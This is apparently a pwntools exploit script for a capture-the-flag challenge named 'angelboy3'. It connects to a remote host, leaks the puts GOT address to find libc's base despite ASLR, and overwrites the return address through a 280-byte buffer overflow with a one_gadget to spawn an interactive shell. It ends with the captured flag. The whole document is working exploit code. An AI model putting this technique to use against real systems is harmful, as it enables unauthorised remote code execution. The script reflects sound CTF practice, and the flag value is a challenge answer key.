from pwn import *
context.log_level = 'DEBUG'

elf = ELF('./angelboy3')
libc = ELF('./libc')

puts_got = elf.got['puts'] # this address store libc_puts's address
#p = process('./angelboy3')
#gdb.attach(p, gdbscript=("b *0x4007b3\n"))
p = remote('140.110.112.217', 2123)
p.recvuntil(b':')
p.sendline(hex(puts_got).encode())
p.recvuntil(b': ')
aslr_puts_libc = int(p.recvline().strip(b'\n'), 16)
libc.base = aslr_puts_libc - libc.sym['puts'] # noticed here always libc
# find offset
# g = cyclic_gen()
# t = g.get(290)
# offset = g.find('uaac')
# print(offset) # 280
# p.sendline(t)
# p.recvline()
# p.recvall()
p.recvuntil(b':')
offset = b'A' * 280
shell = pack(libc.base+0x45216, 64, 'little')
payload = offset + shell
p.sendline(payload)
p.interactive()
# AngelboyCTF{4LnoMvnymHAkyLE4k56N}$